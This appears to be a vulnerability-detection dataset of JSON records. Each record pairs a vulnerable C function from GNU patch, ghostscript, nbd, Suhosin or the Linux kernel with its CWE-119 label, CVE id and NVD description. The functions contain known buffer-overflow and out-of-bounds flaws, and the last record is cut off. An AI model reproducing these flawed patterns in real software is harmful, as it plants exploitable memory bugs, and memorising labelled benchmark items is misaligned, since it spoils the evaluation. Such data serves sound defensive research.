{"idx": 535, "project": "savannah", "commit_id": "a0d7fe4589651c64bd16ddaaa634030bb0455866", "project_url": "https://git.savannah.gnu.org/gitweb/?p=gnutls", "commit_url": "https://git.savannah.gnu.org/cgit/patch.git/commit/src/pch.c?id=a0d7fe4589651c64bd16ddaaa634030bb0455866", "commit_message": "None", "target": 1, "func": " pch_write_line (lin line, FILE *file)\n {\n  bool after_newline = p_line[line][p_len[line] - 1] == '\\n';\n   if (! fwrite (p_line[line], sizeof (*p_line[line]), p_len[line], file))\n     write_fatal ();\n   return after_newline;\n}\n", "func_hash": 109748454555121695743182615951035156943, "file_name": "None", "file_hash": null, "cwe": ["CWE-119"], "cve": "CVE-2016-10713", "cve_desc": "An issue was discovered in GNU patch before 2.7.6. Out-of-bounds access within pch_write_line() in pch.c can possibly lead to DoS via a crafted input file.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2016-10713"}
{"idx": 540, "project": "ghostscript", "commit_id": "e698d5c11d27212aa1098bc5b1673a3378563092", "project_url": "http://git.ghostscript.com/?p=mupdf", "commit_url": "http://git.ghostscript.com/?p=jbig2dec.git;a=commit;h=e698d5c11d27212aa1098bc5b1673a3378563092", "commit_message": "None", "target": 1, "func": "jbig2_decode_gray_scale_image(Jbig2Ctx *ctx, Jbig2Segment *segment,\n                              const byte *data, const size_t size,\n                              bool GSMMR, uint32_t GSW, uint32_t GSH,\n                              uint32_t GSBPP, bool GSUSESKIP, Jbig2Image *GSKIP, int GSTEMPLATE, Jbig2ArithCx *GB_stats)\n {\n     uint8_t **GSVALS = NULL;\n     size_t consumed_bytes = 0;\n    int i, j, code, stride;\n    int x, y;\n     Jbig2Image **GSPLANES;\n     Jbig2GenericRegionParams rparams;\n     Jbig2WordStream *ws = NULL;\n    Jbig2ArithState *as = NULL;\n\n    /* allocate GSPLANES */\n    GSPLANES = jbig2_new(ctx, Jbig2Image *, GSBPP);\n    if (GSPLANES == NULL) {\n        jbig2_error(ctx, JBIG2_SEVERITY_FATAL, segment->number, \"failed to allocate %d bytes for GSPLANES\", GSBPP);\n        return NULL;\n    }\n\n    for (i = 0; i < GSBPP; ++i) {\n        GSPLANES[i] = jbig2_image_new(ctx, GSW, GSH);\n         if (GSPLANES[i] == NULL) {\n             jbig2_error(ctx, JBIG2_SEVERITY_FATAL, segment->number, \"failed to allocate %dx%d image for GSPLANES\", GSW, GSH);\n             /* free already allocated */\n            for (j = i - 1; j >= 0; --j) {\n                jbig2_image_release(ctx, GSPLANES[j]);\n            }\n             jbig2_free(ctx->allocator, GSPLANES);\n             return NULL;\n         }\n        }\n    }\n", "func_hash": 304560407984194980999184469502825270703, "file_name": "None", "file_hash": null, "cwe": ["CWE-119"], "cve": "CVE-2016-9601", "cve_desc": "ghostscript before version 9.21 is vulnerable to a heap based buffer overflow that was found in the ghostscript jbig2_decode_gray_scale_image function which is used to decode halftone segments in a JBIG2 image. A document (PostScript or PDF) with an embedded, specially crafted, jbig2 image could trigger a segmentation fault in ghostscript.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2016-9601"}
{"idx": 570, "project": "nbd", "commit_id": "3ef52043861ab16352d49af89e048ba6339d6df8", "project_url": "https://github.com/yoe/nbd", "commit_url": "https://github.com/yoe/nbd/commit/3ef52043861ab16352d49af89e048ba6339d6df8", "commit_message": "Fix buffer size checking\n\nYes, this means we've re-introduced CVE-2005-3534. Sigh.", "target": 1, "func": "int mainloop(CLIENT *client) {\n\tstruct nbd_request request;\n\tstruct nbd_reply reply;\n\tgboolean go_on=TRUE;\n#ifdef DODBG\n\tint i = 0;\n#endif\n\tnegotiate(client->net, client, NULL);\n\tDEBUG(\"Entering request loop!\\n\");\n\treply.magic = htonl(NBD_REPLY_MAGIC);\n\treply.error = 0;\n\twhile (go_on) {\n\t\tchar buf[BUFSIZE];\n\t\tsize_t len;\n#ifdef DODBG\n\t\ti++;\n\t\tprintf(\"%d: \", i);\n#endif\n\t\treadit(client->net, &request, sizeof(request));\n\t\trequest.from = ntohll(request.from);\n\t\trequest.type = ntohl(request.type);\n\n\t\tif (request.type==NBD_CMD_DISC) {\n\t\t\tmsg2(LOG_INFO, \"Disconnect request received.\");\n                \tif (client->server->flags & F_COPYONWRITE) { \n\t\t\t\tif (client->difmap) g_free(client->difmap) ;\n                \t\tclose(client->difffile);\n\t\t\t\tunlink(client->difffilename);\n\t\t\t\tfree(client->difffilename);\n\t\t\t}\n\t\t\tgo_on=FALSE;\n\t\t\tcontinue;\n\t\t}\n\n\t\tlen = ntohl(request.len);\n \n \t\tif (request.magic != htonl(NBD_REQUEST_MAGIC))\n \t\t\terr(\"Not enough magic.\");\n\t\tif (len > BUFSIZE + sizeof(struct nbd_reply))\n \t\t\terr(\"Request too big!\");\n #ifdef DODBG\n \t\tprintf(\"%s from %llu (%llu) len %d, \", request.type ? \"WRITE\" :\n\t\t\t\t\"READ\", (unsigned long long)request.from,\n\t\t\t\t(unsigned long long)request.from / 512, len);\n#endif\n\t\tmemcpy(reply.handle, request.handle, sizeof(reply.handle));\n\t\tif ((request.from + len) > (OFFT_MAX)) {\n\t\t\tDEBUG(\"[Number too large!]\");\n\t\t\tERROR(client, reply, EINVAL);\n\t\t\tcontinue;\n\t\t}\n\n\t\tif (((ssize_t)((off_t)request.from + len) > client->exportsize)) {\n\t\t\tDEBUG(\"[RANGE!]\");\n\t\t\tERROR(client, reply, EINVAL);\n\t\t\tcontinue;\n\t\t}\n\n\t\tif (request.type==NBD_CMD_WRITE) {\n\t\t\tDEBUG(\"wr: net->buf, \");\n\t\t\treadit(client->net, buf, len);\n\t\t\tDEBUG(\"buf->exp, \");\n\t\t\tif ((client->server->flags & F_READONLY) ||\n\t\t\t    (client->server->flags & F_AUTOREADONLY)) {\n\t\t\t\tDEBUG(\"[WRITE to READONLY!]\");\n\t\t\t\tERROR(client, reply, EPERM);\n\t\t\t\tcontinue;\n\t\t\t}\n\t\t\tif (expwrite(request.from, buf, len, client)) {\n\t\t\t\tDEBUG(\"Write failed: %m\" );\n\t\t\t\tERROR(client, reply, errno);\n\t\t\t\tcontinue;\n\t\t\t}\n\t\t\tSEND(client->net, reply);\n\t\t\tDEBUG(\"OK!\\n\");\n\t\t\tcontinue;\n\t\t}\n\t\t/* READ */\n\n\t\tDEBUG(\"exp->buf, \");\n\t\tif (expread(request.from, buf + sizeof(struct nbd_reply), len, client)) {\n\t\t\tDEBUG(\"Read failed: %m\");\n\t\t\tERROR(client, reply, errno);\n\t\t\tcontinue;\n\t\t}\n\n\t\tDEBUG(\"buf->net, \");\n\t\tmemcpy(buf, &reply, sizeof(struct nbd_reply));\n\t\twriteit(client->net, buf, len + sizeof(struct nbd_reply));\n\t\tDEBUG(\"OK!\\n\");\n\t}\n\treturn 0;\n}\n", "func_hash": 21610058009013440610924702255406066217, "file_name": "nbd-server.c", "file_hash": 204775428507829937641077380751146136112, "cwe": ["CWE-119"], "cve": "CVE-2011-0530", "cve_desc": "Buffer overflow in the mainloop function in nbd-server.c in the server in Network Block Device (nbd) before 2.9.20 might allow remote attackers to execute arbitrary code via a long request.  NOTE: this issue exists because of a CVE-2005-3534 regression.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2011-0530"}
{"idx": 627, "project": "linux", "commit_id": "79549c6dfda0603dba9a70a53467ce62d9335c33", "project_url": "https://github.com/torvalds/linux", "commit_url": "https://github.com/torvalds/linux/commit/79549c6dfda0603dba9a70a53467ce62d9335c33", "commit_message": "cred: copy_process() should clear child->replacement_session_keyring\n\nkeyctl_session_to_parent(task) sets ->replacement_session_keyring,\nit should be processed and cleared by key_replace_session_keyring().\n\nHowever, this task can fork before it notices TIF_NOTIFY_RESUME and\nthe new child gets the bogus ->replacement_session_keyring copied by\ndup_task_struct(). This is obviously wrong and, if nothing else, this\nleads to put_cred(already_freed_cred).\n\nchange copy_creds() to clear this member. If copy_process() fails\nbefore this point the wrong ->replacement_session_keyring doesn't\nmatter, exit_creds() won't be called.\n\nCc: <stable@vger.kernel.org>\nSigned-off-by: Oleg Nesterov <oleg@redhat.com>\nAcked-by: David Howells <dhowells@redhat.com>\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>", "target": 1, "func": "int copy_creds(struct task_struct *p, unsigned long clone_flags)\n{\n#ifdef CONFIG_KEYS\n\tstruct thread_group_cred *tgcred;\n#endif\n \tstruct cred *new;\n \tint ret;\n \n \tif (\n #ifdef CONFIG_KEYS\n \t\t!p->cred->thread_keyring &&\n#endif\n\t\tclone_flags & CLONE_THREAD\n\t    ) {\n\t\tp->real_cred = get_cred(p->cred);\n\t\tget_cred(p->cred);\n\t\talter_cred_subscribers(p->cred, 2);\n\t\tkdebug(\"share_creds(%p{%d,%d})\",\n\t\t       p->cred, atomic_read(&p->cred->usage),\n\t\t       read_cred_subscribers(p->cred));\n\t\tatomic_inc(&p->cred->user->processes);\n\t\treturn 0;\n\t}\n\n\tnew = prepare_creds();\n\tif (!new)\n\t\treturn -ENOMEM;\n\n\tif (clone_flags & CLONE_NEWUSER) {\n\t\tret = create_user_ns(new);\n\t\tif (ret < 0)\n\t\t\tgoto error_put;\n\t}\n\n\t/* cache user_ns in cred.  Doesn't need a refcount because it will\n\t * stay pinned by cred->user\n\t */\n\tnew->user_ns = new->user->user_ns;\n\n#ifdef CONFIG_KEYS\n\t/* new threads get their own thread keyrings if their parent already\n\t * had one */\n\tif (new->thread_keyring) {\n\t\tkey_put(new->thread_keyring);\n\t\tnew->thread_keyring = NULL;\n\t\tif (clone_flags & CLONE_THREAD)\n\t\t\tinstall_thread_keyring_to_cred(new);\n\t}\n\n\t/* we share the process and session keyrings between all the threads in\n\t * a process - this is slightly icky as we violate COW credentials a\n\t * bit */\n\tif (!(clone_flags & CLONE_THREAD)) {\n\t\ttgcred = kmalloc(sizeof(*tgcred), GFP_KERNEL);\n\t\tif (!tgcred) {\n\t\t\tret = -ENOMEM;\n\t\t\tgoto error_put;\n\t\t}\n\t\tatomic_set(&tgcred->usage, 1);\n\t\tspin_lock_init(&tgcred->lock);\n\t\ttgcred->process_keyring = NULL;\n\t\ttgcred->session_keyring = key_get(new->tgcred->session_keyring);\n\n\t\trelease_tgcred(new);\n\t\tnew->tgcred = tgcred;\n\t}\n#endif\n\n\tatomic_inc(&new->user->processes);\n\tp->cred = p->real_cred = get_cred(new);\n\talter_cred_subscribers(new, 2);\n\tvalidate_creds(new);\n\treturn 0;\n\nerror_put:\n\tput_cred(new);\n\treturn ret;\n}\n", "func_hash": 297010684195110082025299424642759875579, "file_name": "cred.c", "file_hash": 39275897372619240457371967102068403083, "cwe": ["CWE-119"], "cve": "CVE-2012-2745", "cve_desc": "The copy_creds function in kernel/cred.c in the Linux kernel before 3.3.2 provides an invalid replacement session keyring to a child process, which allows local users to cause a denial of service (panic) via a crafted application that uses the fork system call.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2012-2745"}
{"idx": 678, "project": "suhosin", "commit_id": "73b1968ee30f6d9d2dae497544b910e68e114bfa", "project_url": "https://github.com/stefanesser/suhosin", "commit_url": "https://github.com/stefanesser/suhosin/commit/73b1968ee30f6d9d2dae497544b910e68e114bfa", "commit_message": "Fixed stack based buffer overflow in transparent cookie encryption (see separate advisory)", "target": 1, "func": " char *suhosin_encrypt_single_cookie(char *name, int name_len, char *value, int value_len, char *key TSRMLS_DC)\n {\n\tchar buffer[4096];\n    char buffer2[4096];\n\tchar *buf = buffer, *buf2 = buffer2, *d, *d_url;\n    int l;\n\tif (name_len > sizeof(buffer)-2) {\n\t\tbuf = estrndup(name, name_len);\n\t} else {\n\t\tmemcpy(buf, name, name_len);\n\t\tbuf[name_len] = 0;\n\t}\n \t\n \tname_len = php_url_decode(buf, name_len);\n    normalize_varname(buf);\n    name_len = strlen(buf);\n \t\n \tif (SUHOSIN_G(cookie_plainlist)) {\n \t\tif (zend_hash_exists(SUHOSIN_G(cookie_plainlist), buf, name_len+1)) {\n encrypt_return_plain:\n\t\t\tif (buf != buffer) {\n\t\t\t\tefree(buf);\n\t\t\t}\n \t\t\treturn estrndup(value, value_len);\n \t\t}\n \t} else if (SUHOSIN_G(cookie_cryptlist)) {\n\t\tif (!zend_hash_exists(SUHOSIN_G(cookie_cryptlist), buf, name_len+1)) {\n\t\t\tgoto encrypt_return_plain;\n \t\t}\n \t}\n \t\n\tif (strlen(value) <= sizeof(buffer2)-2) {\n\t\tmemcpy(buf2, value, value_len);\n\t\tbuf2[value_len] = 0;\n\t} else {\n\t\tbuf2 = estrndup(value, value_len);\n\t}\n \t\n \tvalue_len = php_url_decode(buf2, value_len);\n \t\n \td = suhosin_encrypt_string(buf2, value_len, buf, name_len, key TSRMLS_CC);\n \td_url = php_url_encode(d, strlen(d), &l);\n \tefree(d);\n    if (buf != buffer) {\n\t\tefree(buf);\n\t}\n    if (buf2 != buffer2) {\n\t\tefree(buf2);\n\t}\n \treturn d_url;\n }\n", "func_hash": 41838469559935618440812276411540013889, "file_name": "header.c", "file_hash": 22878982287999907022125918925783518498, "cwe": ["CWE-119"], "cve": "CVE-2012-0807", "cve_desc": "Stack-based buffer overflow in the suhosin_encrypt_single_cookie function in the transparent cookie-encryption feature in the Suhosin extension before 0.9.33 for PHP, when suhosin.cookie.encrypt and suhosin.multiheader are enabled, might allow remote attackers to execute arbitrary code via a long string that is used in a Set-Cookie HTTP header.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2012-0807"}
{"idx": 754, "project": "linux", "commit_id": "15291164b22a357cb211b618adfef4fa82fc0de3", "project_url": "https://github.com/torvalds/linux", "commit_url": "https://github.com/torvalds/linux/commit/15291164b22a357cb211b618adfef4fa82fc0de3", "commit_message": "jbd2: clear BH_Delay & BH_Unwritten in journal_unmap_buffer\n\njournal_unmap_buffer()'s zap_buffer: code clears a lot of buffer head\nstate ala discard_buffer(), but does not touch _Delay or _Unwritten as\ndiscard_buffer() does.\n\nThis can be problematic in some areas of the ext4 code which assume\nthat if they have found a buffer marked unwritten or delay, then it's\na live one.  Perhaps those spots should check whether it is mapped\nas well, but if jbd2 is going to tear down a buffer, let's really\ntear it down completely.\n\nWithout this I get some fsx failures on sub-page-block filesystems\nup until v3.2, at which point 4e96b2dbbf1d7e81f22047a50f862555a6cb87cb\nand 189e868fa8fdca702eb9db9d8afc46b5cb9144c9 make the failures go\naway, because buried within that large change is some more flag\nclearing.  I still think it's worth doing in jbd2, since\n->invalidatepage leads here directly, and it's the right place\nto clear away these flags.\n\nSigned-off-by: Eric Sandeen <sandeen@redhat.com>\nSigned-off-by: \"Theodore Ts'o\" <tytso@mit.edu>\nCc: stable@vger.kernel.org", "target": 1, "func": "static int journal_unmap_buffer(journal_t *journal, struct buffer_head *bh)\n{\n\ttransaction_t *transaction;\n\tstruct journal_head *jh;\n\tint may_free = 1;\n\tint ret;\n\n\tBUFFER_TRACE(bh, \"entry\");\n\n\t/*\n\t * It is safe to proceed here without the j_list_lock because the\n\t * buffers cannot be stolen by try_to_free_buffers as long as we are\n\t * holding the page lock. --sct\n\t */\n\n\tif (!buffer_jbd(bh))\n\t\tgoto zap_buffer_unlocked;\n\n\t/* OK, we have data buffer in journaled mode */\n\twrite_lock(&journal->j_state_lock);\n\tjbd_lock_bh_state(bh);\n\tspin_lock(&journal->j_list_lock);\n\n\tjh = jbd2_journal_grab_journal_head(bh);\n\tif (!jh)\n\t\tgoto zap_buffer_no_jh;\n\n\t/*\n\t * We cannot remove the buffer from checkpoint lists until the\n\t * transaction adding inode to orphan list (let's call it T)\n\t * is committed.  Otherwise if the transaction changing the\n\t * buffer would be cleaned from the journal before T is\n\t * committed, a crash will cause that the correct contents of\n\t * the buffer will be lost.  On the other hand we have to\n\t * clear the buffer dirty bit at latest at the moment when the\n\t * transaction marking the buffer as freed in the filesystem\n\t * structures is committed because from that moment on the\n\t * buffer can be reallocated and used by a different page.\n\t * Since the block hasn't been freed yet but the inode has\n\t * already been added to orphan list, it is safe for us to add\n\t * the buffer to BJ_Forget list of the newest transaction.\n\t */\n\ttransaction = jh->b_transaction;\n\tif (transaction == NULL) {\n\t\t/* First case: not on any transaction.  If it\n\t\t * has no checkpoint link, then we can zap it:\n\t\t * it's a writeback-mode buffer so we don't care\n\t\t * if it hits disk safely. */\n\t\tif (!jh->b_cp_transaction) {\n\t\t\tJBUFFER_TRACE(jh, \"not on any transaction: zap\");\n\t\t\tgoto zap_buffer;\n\t\t}\n\n\t\tif (!buffer_dirty(bh)) {\n\t\t\t/* bdflush has written it.  We can drop it now */\n\t\t\tgoto zap_buffer;\n\t\t}\n\n\t\t/* OK, it must be in the journal but still not\n\t\t * written fully to disk: it's metadata or\n\t\t * journaled data... */\n\n\t\tif (journal->j_running_transaction) {\n\t\t\t/* ... and once the current transaction has\n\t\t\t * committed, the buffer won't be needed any\n\t\t\t * longer. */\n\t\t\tJBUFFER_TRACE(jh, \"checkpointed: add to BJ_Forget\");\n\t\t\tret = __dispose_buffer(jh,\n\t\t\t\t\tjournal->j_running_transaction);\n\t\t\tjbd2_journal_put_journal_head(jh);\n\t\t\tspin_unlock(&journal->j_list_lock);\n\t\t\tjbd_unlock_bh_state(bh);\n\t\t\twrite_unlock(&journal->j_state_lock);\n\t\t\treturn ret;\n\t\t} else {\n\t\t\t/* There is no currently-running transaction. So the\n\t\t\t * orphan record which we wrote for this file must have\n\t\t\t * passed into commit.  We must attach this buffer to\n\t\t\t * the committing transaction, if it exists. */\n\t\t\tif (journal->j_committing_transaction) {\n\t\t\t\tJBUFFER_TRACE(jh, \"give to committing trans\");\n\t\t\t\tret = __dispose_buffer(jh,\n\t\t\t\t\tjournal->j_committing_transaction);\n\t\t\t\tjbd2_journal_put_journal_head(jh);\n\t\t\t\tspin_unlock(&journal->j_list_lock);\n\t\t\t\tjbd_unlock_bh_state(bh);\n\t\t\t\twrite_unlock(&journal->j_state_lock);\n\t\t\t\treturn ret;\n\t\t\t} else {\n\t\t\t\t/* The orphan record's transaction has\n\t\t\t\t * committed.  We can cleanse this buffer */\n\t\t\t\tclear_buffer_jbddirty(bh);\n\t\t\t\tgoto zap_buffer;\n\t\t\t}\n\t\t}\n\t} else if (transaction == journal->j_committing_transaction) {\n\t\tJBUFFER_TRACE(jh, \"on committing transaction\");\n\t\t/*\n\t\t * The buffer is committing, we simply cannot touch\n\t\t * it. So we just set j_next_transaction to the\n\t\t * running transaction (if there is one) and mark\n\t\t * buffer as freed so that commit code knows it should\n\t\t * clear dirty bits when it is done with the buffer.\n\t\t */\n\t\tset_buffer_freed(bh);\n\t\tif (journal->j_running_transaction && buffer_jbddirty(bh))\n\t\t\tjh->b_next_transaction = journal->j_running_transaction;\n\t\tjbd2_journal_put_journal_head(jh);\n\t\tspin_unlock(&journal->j_list_lock);\n\t\tjbd_unlock_bh_state(bh);\n\t\twrite_unlock(&journal->j_state_lock);\n\t\treturn 0;\n\t} else {\n\t\t/* Good, the buffer belongs to the running transaction.\n\t\t * We are writing our own transaction's data, not any\n\t\t * previous one's, so it is safe to throw it away\n\t\t * (remember that we expect the filesystem to have set\n\t\t * i_size already for this truncate so recovery will not\n\t\t * expose the disk blocks we are discarding here.) */\n\t\tJ_ASSERT_JH(jh, transaction == journal->j_running_transaction);\n\t\tJBUFFER_TRACE(jh, \"on running transaction\");\n\t\tmay_free = __dispose_buffer(jh, transaction);\n\t}\n\nzap_buffer:\n\tjbd2_journal_put_journal_head(jh);\nzap_buffer_no_jh:\n\tspin_unlock(&journal->j_list_lock);\n\tjbd_unlock_bh_state(bh);\n\twrite_unlock(&journal->j_state_lock);\nzap_buffer_unlocked:\n\tclear_buffer_dirty(bh);\n\tJ_ASSERT_BH(bh, !buffer_jbddirty(bh));\n \tclear_buffer_mapped(bh);\n \tclear_buffer_req(bh);\n \tclear_buffer_new(bh);\n \tbh->b_bdev = NULL;\n \treturn may_free;\n }\n", "func_hash": 113708723622617744945038418263908097733, "file_name": "transaction.c", "file_hash": 47966770736610397294923539281850275183, "cwe": ["CWE-119"], "cve": "CVE-2011-4086", "cve_desc": "The journal_unmap_buffer function in fs/jbd2/transaction.c in the Linux kernel before 3.3.1 does not properly handle the _Delay and _Unwritten buffer head states, which allows local users to cause a denial of service (system crash) by leveraging the presence of an ext4 filesystem that was mounted with a journal.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2011-4086"}
{"idx": 758, "project": "linux", "commit_id": "c85ce65ecac078ab1a1835c87c4a6319cf74660a", "project_url": "https://github.com/torvalds/linux", "commit_url": "https://github.com/torvalds/linux/commit/c85ce65ecac078ab1a1835c87c4a6319cf74660a", "commit_message": "b43: allocate receive buffers big enough for max frame len + offset\n\nOtherwise, skb_put inside of dma_rx can fail...\n\n\thttps://bugzilla.kernel.org/show_bug.cgi?id=32042\n\nSigned-off-by: John W. Linville <linville@tuxdriver.com>\nAcked-by: Larry Finger <Larry.Finger@lwfinger.net>\nCc: stable@kernel.org", "target": 1, "func": "static void dma_rx(struct b43_dmaring *ring, int *slot)\n{\n\tconst struct b43_dma_ops *ops = ring->ops;\n\tstruct b43_dmadesc_generic *desc;\n\tstruct b43_dmadesc_meta *meta;\n\tstruct b43_rxhdr_fw4 *rxhdr;\n\tstruct sk_buff *skb;\n\tu16 len;\n\tint err;\n\tdma_addr_t dmaaddr;\n\n\tdesc = ops->idx2desc(ring, *slot, &meta);\n\n\tsync_descbuffer_for_cpu(ring, meta->dmaaddr, ring->rx_buffersize);\n\tskb = meta->skb;\n\n\trxhdr = (struct b43_rxhdr_fw4 *)skb->data;\n\tlen = le16_to_cpu(rxhdr->frame_len);\n\tif (len == 0) {\n\t\tint i = 0;\n\n\t\tdo {\n\t\t\tudelay(2);\n\t\t\tbarrier();\n\t\t\tlen = le16_to_cpu(rxhdr->frame_len);\n\t\t} while (len == 0 && i++ < 5);\n\t\tif (unlikely(len == 0)) {\n\t\t\tdmaaddr = meta->dmaaddr;\n\t\t\tgoto drop_recycle_buffer;\n\t\t}\n\t}\n\tif (unlikely(b43_rx_buffer_is_poisoned(ring, skb))) {\n\t\t/* Something went wrong with the DMA.\n\t\t * The device did not touch the buffer and did not overwrite the poison. */\n\t\tb43dbg(ring->dev->wl, \"DMA RX: Dropping poisoned buffer.\\n\");\n \t\tdmaaddr = meta->dmaaddr;\n \t\tgoto drop_recycle_buffer;\n \t}\n\tif (unlikely(len > ring->rx_buffersize)) {\n \t\t/* The data did not fit into one descriptor buffer\n \t\t * and is split over multiple buffers.\n \t\t * This should never happen, as we try to allocate buffers\n\t\t * big enough. So simply ignore this packet.\n\t\t */\n\t\tint cnt = 0;\n\t\ts32 tmp = len;\n\n\t\twhile (1) {\n\t\t\tdesc = ops->idx2desc(ring, *slot, &meta);\n\t\t\t/* recycle the descriptor buffer. */\n\t\t\tb43_poison_rx_buffer(ring, meta->skb);\n\t\t\tsync_descbuffer_for_device(ring, meta->dmaaddr,\n\t\t\t\t\t\t   ring->rx_buffersize);\n\t\t\t*slot = next_slot(ring, *slot);\n\t\t\tcnt++;\n\t\t\ttmp -= ring->rx_buffersize;\n\t\t\tif (tmp <= 0)\n\t\t\t\tbreak;\n\t\t}\n\t\tb43err(ring->dev->wl, \"DMA RX buffer too small \"\n\t\t       \"(len: %u, buffer: %u, nr-dropped: %d)\\n\",\n\t\t       len, ring->rx_buffersize, cnt);\n\t\tgoto drop;\n\t}\n\n\tdmaaddr = meta->dmaaddr;\n\terr = setup_rx_descbuffer(ring, desc, meta, GFP_ATOMIC);\n\tif (unlikely(err)) {\n\t\tb43dbg(ring->dev->wl, \"DMA RX: setup_rx_descbuffer() failed\\n\");\n\t\tgoto drop_recycle_buffer;\n\t}\n\n\tunmap_descbuffer(ring, dmaaddr, ring->rx_buffersize, 0);\n\tskb_put(skb, len + ring->frameoffset);\n\tskb_pull(skb, ring->frameoffset);\n\n\tb43_rx(ring->dev, skb, rxhdr);\ndrop:\n\treturn;\n\ndrop_recycle_buffer:\n\t/* Poison and recycle the RX buffer. */\n\tb43_poison_rx_buffer(ring, skb);\n\tsync_descbuffer_for_device(ring, dmaaddr, ring->rx_buffersize);\n}\n", "func_hash": 104346933262330900978913399332634585939, "file_name": "dma.c", "file_hash": 2031226938724601320339783189743185185, "cwe": ["CWE-119"], "cve": "CVE-2011-3359", "cve_desc": "The dma_rx function in drivers/net/wireless/b43/dma.c in the Linux kernel before 2.6.39 does not properly allocate receive buffers, which allows remote attackers to cause a denial of service (system crash) via a crafted frame.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2011-3359"}
{"idx": 759, "project": "linux", "commit_id": "c2183d1e9b3f313dd8ba2b1b0197c8d9fb86a7ae", "project_url": "https://github.com/torvalds/linux", "commit_url": "https://github.com/torvalds/linux/commit/c2183d1e9b3f313dd8ba2b1b0197c8d9fb86a7ae", "commit_message": "fuse: check size of FUSE_NOTIFY_INVAL_ENTRY message\n\nFUSE_NOTIFY_INVAL_ENTRY didn't check the length of the write so the\nmessage processing could overrun and result in a \"kernel BUG at\nfs/fuse/dev.c:629!\"\n\nReported-by: Han-Wen Nienhuys <hanwenn@gmail.com>\nSigned-off-by: Miklos Szeredi <mszeredi@suse.cz>\nCC: stable@kernel.org", "target": 1, "func": "static int fuse_notify_inval_entry(struct fuse_conn *fc, unsigned int size,\n\t\t\t\t   struct fuse_copy_state *cs)\n{\n\tstruct fuse_notify_inval_entry_out outarg;\n\tint err = -ENOMEM;\n\tchar *buf;\n\tstruct qstr name;\n\n\tbuf = kzalloc(FUSE_NAME_MAX + 1, GFP_KERNEL);\n\tif (!buf)\n\t\tgoto err;\n\n\terr = -EINVAL;\n\tif (size < sizeof(outarg))\n\t\tgoto err;\n\n\terr = fuse_copy_one(cs, &outarg, sizeof(outarg));\n\tif (err)\n\t\tgoto err;\n\n\terr = -ENAMETOOLONG;\n \tif (outarg.namelen > FUSE_NAME_MAX)\n \t\tgoto err;\n \n \tname.name = buf;\n \tname.len = outarg.namelen;\n \terr = fuse_copy_one(cs, buf, outarg.namelen + 1);\n\tif (err)\n\t\tgoto err;\n\tfuse_copy_finish(cs);\n\tbuf[outarg.namelen] = 0;\n\tname.hash = full_name_hash(name.name, name.len);\n\n\tdown_read(&fc->killsb);\n\terr = -ENOENT;\n\tif (fc->sb)\n\t\terr = fuse_reverse_inval_entry(fc->sb, outarg.parent, &name);\n\tup_read(&fc->killsb);\n\tkfree(buf);\n\treturn err;\n\nerr:\n\tkfree(buf);\n\tfuse_copy_finish(cs);\n\treturn err;\n}\n", "func_hash": 64929278621445786641724855732949782650, "file_name": "dev.c", "file_hash": 242934778288113498357673577108769973314, "cwe": ["CWE-119"], "cve": "CVE-2011-3353", "cve_desc": "Buffer overflow in the fuse_notify_inval_entry function in fs/fuse/dev.c in the Linux kernel before 3.1 allows local users to cause a denial of service (BUG_ON and system crash) by leveraging the ability to mount a FUSE filesystem.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2011-3353"}
{"idx": 854, "project": "linux", "commit_id": "cae13fe4cc3f24820ffb990c09110626837e85d4", "project_url": "https://github.com/torvalds/linux", "commit_url": "https://github.com/torvalds/linux/commit/cae13fe4cc3f24820ffb990c09110626837e85d4", "commit_message": "Fix for buffer overflow in ldm_frag_add not sufficient\n\nAs Ben Hutchings discovered [1], the patch for CVE-2011-1017 (buffer\noverflow in ldm_frag_add) is not sufficient.  The original patch in\ncommit c340b1d64000 (\"fs/partitions/ldm.c: fix oops caused by corrupted\npartition table\") does not consider that, for subsequent fragments,\npreviously allocated memory is used.\n\n[1] http://lkml.org/lkml/2011/5/6/407\n\nReported-by: Ben Hutchings <ben@decadent.org.uk>\nSigned-off-by: Timo Warns <warns@pre-sense.de>\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>", "target": 1, "func": "static bool ldm_frag_add (const u8 *data, int size, struct list_head *frags)\n{\n\tstruct frag *f;\n\tstruct list_head *item;\n\tint rec, num, group;\n\n\tBUG_ON (!data || !frags);\n\n\tif (size < 2 * VBLK_SIZE_HEAD) {\n\t\tldm_error(\"Value of size is to small.\");\n\t\treturn false;\n\t}\n\n\tgroup = get_unaligned_be32(data + 0x08);\n\trec   = get_unaligned_be16(data + 0x0C);\n\tnum   = get_unaligned_be16(data + 0x0E);\n\tif ((num < 1) || (num > 4)) {\n\t\tldm_error (\"A VBLK claims to have %d parts.\", num);\n\t\treturn false;\n\t}\n\tif (rec >= num) {\n\t\tldm_error(\"REC value (%d) exceeds NUM value (%d)\", rec, num);\n\t\treturn false;\n\t}\n\n\tlist_for_each (item, frags) {\n\t\tf = list_entry (item, struct frag, list);\n\t\tif (f->group == group)\n\t\t\tgoto found;\n\t}\n\n\tf = kmalloc (sizeof (*f) + size*num, GFP_KERNEL);\n\tif (!f) {\n\t\tldm_crit (\"Out of memory.\");\n\t\treturn false;\n\t}\n\n\tf->group = group;\n\tf->num   = num;\n\tf->rec   = rec;\n\tf->map   = 0xFF << num;\n \n \tlist_add_tail (&f->list, frags);\n found:\n \tif (f->map & (1 << rec)) {\n \t\tldm_error (\"Duplicate VBLK, part %d.\", rec);\n \t\tf->map &= 0x7F;\t\t\t/* Mark the group as broken */\n\t\treturn false;\n\t}\n\n\tf->map |= (1 << rec);\n\n\tdata += VBLK_SIZE_HEAD;\n\tsize -= VBLK_SIZE_HEAD;\n\n\tmemcpy (f->data+rec*(size-VBLK_SIZE_HEAD)+VBLK_SIZE_HEAD, data, size);\n\n\treturn true;\n}\n", "func_hash": 164142535356774616118975210091758939882, "file_name": "ldm.c", "file_hash": 72782463213063020085568894103416042932, "cwe": ["CWE-119"], "cve": "CVE-2011-2182", "cve_desc": "The ldm_frag_add function in fs/partitions/ldm.c in the Linux kernel before 2.6.39.1 does not properly handle memory allocation for non-initial fragments, which might allow local users to conduct buffer overflow 